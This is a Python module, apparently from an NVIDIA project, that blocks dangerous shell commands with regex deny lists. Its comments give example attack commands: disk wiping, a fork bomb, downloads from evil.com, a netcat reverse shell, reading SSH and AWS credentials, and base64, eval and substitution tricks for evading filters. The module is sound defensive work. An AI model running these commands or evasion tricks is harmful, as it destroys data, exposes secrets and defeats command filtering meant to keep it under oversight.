# SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Shell command validation for security.

This module provides pattern-based validation to block dangerous shell commands
and common bypass techniques that could be used to evade command filtering.
"""

import re

# Dangerous command patterns that should be blocked for security.
# Each tuple contains (compiled_regex, error_message).
DANGEROUS_PATTERNS: list[tuple[re.Pattern, str]] = [
    # ===== Destructive system commands =====
    # Examples: "rm -rf /", "rm -rf ~", "rm -fr /"
    (re.compile(r'\brm\s+(-[^\s]*\s+)*[/~](\s|$)'),
     "Deleting root or home directory is not allowed"),

    # Examples: "rm -rf ..", "rm -rf ../important"
    (re.compile(r'\brm\s+(-[^\s]*\s+)*\.\.'),
     "Deleting parent directory is not allowed"),

    # Examples: "rm -rf *", "rm -rf ./*"
    (re.compile(r'\brm\s+(-[^\s]*\s+)*\*'),
     "Wildcard deletion is not allowed"),

    # Examples: "> /dev/sda", "echo x > /dev/mem" (allows /dev/null)
    (re.compile(r'>\s*/dev/(?!null)'),
     "Writing to device files is not allowed"),

    # Examples: "mkfs.ext4 /dev/sda", "mkfs -t ext4 /dev/sda1"
    (re.compile(r'\bmkfs\b'),
     "Formatting disks is not allowed"),

    # Examples: "fdisk /dev/sda", "fdisk -l /dev/nvme0n1"
    (re.compile(r'\bfdisk\b'),
     "Disk partitioning is not allowed"),

    # Examples: "dd if=/dev/zero of=/dev/sda", "dd of=/dev/nvme0n1"
    (re.compile(r'\bdd\s+.*\bof=/dev/'),
     "Writing to devices with dd is not allowed"),

    # Examples: "dd if=/dev/sda of=disk.img" (reading sensitive disk data)
    (re.compile(r'\bdd\s+.*\bif=/dev/'),
     "Reading from devices with dd is not allowed"),

    # Fork bomb: :(){ :|:& };:
    (re.compile(r':\(\)\s*\{\s*:\|:&\s*\}\s*;:'),
     "Fork bomb detected"),

    # ===== Privilege escalation =====
    # Examples: "sudo rm -rf /", "echo pwd | sudo -S cmd", "/usr/bin/sudo cmd"
    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?sudo\b'),
     "sudo is not allowed"),

    # Examples: "doas rm file", "/usr/bin/doas cmd"
    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?doas\b'),
     "doas is not allowed"),

    # Examples: "pkexec rm file", "pkexec /bin/bash"
    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?pkexec\b'),
     "pkexec is not allowed"),

    # Examples: "su root", "su - admin", "su -c 'command' user"
    (re.compile(r'(?:^|[;&|`]\s*)su\s+(-[^\s]*\s+)*\w'),
     "su is not allowed"),

    # Examples: "chmod 777 /", "chmod -R 0777 /var"
    (re.compile(r'\bchmod\s+[0-7]*777\b'),
     "Setting 777 permissions is not allowed"),

    # Examples: "chown root file", "chown root:root /etc/passwd"
    (re.compile(r'\bchown\s+root\b'),
     "Changing ownership to root is not allowed"),

    # ===== Sensitive file access =====
    # Examples: "cat /etc/shadow", "> /etc/passwd", "< /etc/sudoers"
    (re.compile(r'[<>]\s*/etc/(?:passwd|shadow|sudoers)'),
     "Accessing sensitive system files is not allowed"),

    # Examples: "cat ~/.ssh/id_rsa", "cat /home/user/.aws/credentials"
    (re.compile(r'\bcat\s+.*/(?:\.ssh/|\.aws/|\.env\b)'),
     "Reading sensitive credential files is not allowed"),

    # ===== Arbitrary code download and network exfiltration =====
    # Examples: "wget http://evil.com/malware.sh", "wget https://x.com/script"
    (re.compile(r'\bwget\s+.*https?://'),
     "Downloading from URLs with wget is not allowed"),

    # Examples: "curl http://evil.com/script.sh", "curl -O https://..."
    (re.compile(r'\bcurl\s+.*https?://'),
     "Downloading from URLs with curl is not allowed"),

    # Examples: "nc -e /bin/bash 10.0.0.1 4444", "ncat -e cmd attacker.com"
    (re.compile(r'\b(?:nc|ncat|netcat)\b.*\s-[^\s]*e'),
     "Netcat reverse shell is not allowed"),
]


# Shell metacharacter bypass patterns that could be used to evade command-based filtering.
# These detect attempts to chain, substitute, or obfuscate commands using shell features.
# Each tuple contains (compiled_regex, error_message).
BYPASS_PATTERNS: list[tuple[re.Pattern, str]] = [
    # ===== Command substitution =====
    # Attackers can use $() or backticks to dynamically construct blocked commands.
    # Examples: "$(cat /etc/shadow)", "$(echo rm -rf /)", "`whoami`", "`sudo reboot`"
    (re.compile(r'\$\([^)]+\)|`[^`]+`'),
     "Command substitution ($() or backticks) is not allowed"),

    # ===== Piping to shell interpreters =====
    # Attackers can pipe malicious commands to shell interpreters to bypass direct command checks.
    # Examples: "echo 'rm -rf /' | bash", "cat script.sh | sh", "curl url | python"
    (re.compile(r'\|\s*(?:bash|sh|zsh|ksh|dash|fish|python[23]?|perl|ruby|node)\b'),
     "Piping to shell interpreter is not allowed"),

    # ===== Base64 encoded command execution =====
    # Attackers can encode malicious commands in base64 to evade pattern matching.
    # Examples: "echo 'cm0gLXJmIC8=' | base64 -d | bash", "base64 -d script.b64 | sh"
    (re.compile(r'base64\s+(-d|--decode).*\|\s*(?:bash|sh|zsh|python|perl)'),
     "Base64 decode to shell execution is not allowed"),

    # ===== Eval and exec execution =====
    # Eval/exec can execute arbitrary strings as commands, bypassing static analysis.
    # Examples: "eval 'rm -rf /'", "eval $(cat cmd.txt)", "exec rm -rf /"
    (re.compile(r'\b(?:eval|exec)\s+'),
     "eval/exec command execution is not allowed"),

    # ===== Here-string/here-doc to interpreter =====
    # Attackers can use here-strings or here-docs to feed commands to interpreters.
    # Examples: "bash <<< 'rm -rf /'", "python <<< 'import os; os.system(\"rm -rf /\")'"
    (re.compile(r'(?:bash|sh|zsh|python[23]?|perl|ruby)\s*<<<'),
     "Here-string to interpreter is not allowed"),

    # ===== Process substitution =====
    # Process substitution can be used to execute commands and feed output as files.
    # Examples: "cat <(curl http://evil.com)", "diff <(cat /etc/shadow) <(cat /etc/passwd)"
    (re.compile(r'<\([^)]+\)'),
     "Process substitution is not allowed"),

    # ===== Hex/octal escape execution =====
    # Attackers can use printf with hex/octal escapes to construct commands.
    # Examples: "printf '\x72\x6d' | bash", "echo $'\x73\x75\x64\x6f'"
    (re.compile(r'printf\s+[\'"][^"\']*\\[xX][0-9a-fA-F].*\|\s*(?:bash|sh)'),
     "Hex escape to shell execution is not allowed"),

    # ===== Environment variable command injection =====
    # Attackers can use env vars to smuggle commands.
    # Examples: "CMD='rm -rf /' && $CMD", "export X='sudo reboot'; $X"
    (re.compile(r'\$\{[^}]+\}.*\|\s*(?:bash|sh)|;\s*\$[A-Z_]+\s*$'),
     "Suspicious environment variable execution pattern detected"),

    # ===== Xargs command execution =====
    # Xargs can be used to execute commands from input.
    # Examples: "echo 'rm -rf /' | xargs", "find . | xargs rm", "cat cmds.txt | xargs -I{} bash -c '{}'"
    (re.compile(r'\|\s*xargs\s+.*(?:-I|-i).*(?:bash|sh|eval)'),
     "Xargs with shell execution is not allowed"),

    # ===== Source/dot command execution =====
    # Source or dot can execute scripts in the current shell context.
    # Examples: "source /tmp/malicious.sh", ". ./exploit.sh", "source <(curl url)"
    (re.compile(r'(?:^|[;&|]\s*)(?:source|\.)[ \t]+'),
     "source/dot command execution is not allowed"),
]


def validate_command(command: str) -> tuple[bool, str]:
    """Validate that a command is safe to execute.

    Checks against two pattern lists:
    1. DANGEROUS_PATTERNS: Direct dangerous commands (rm -rf /, sudo, etc.)
    2. BYPASS_PATTERNS: Shell metacharacter tricks that could evade command filtering

    Args:
        command: The bash command string to validate.

    Returns:
        A tuple of (is_valid, error_message).
        is_valid is True if the command passes all safety checks.
        error_message is empty string if valid, otherwise describes the violation.
    """
    # Check dangerous command patterns
    for pattern, message in DANGEROUS_PATTERNS:
        if pattern.search(command):
            return False, message

    # Check bypass/evasion patterns
    for pattern, message in BYPASS_PATTERNS:
        if pattern.search(command):
            return False, message

    return True, ""
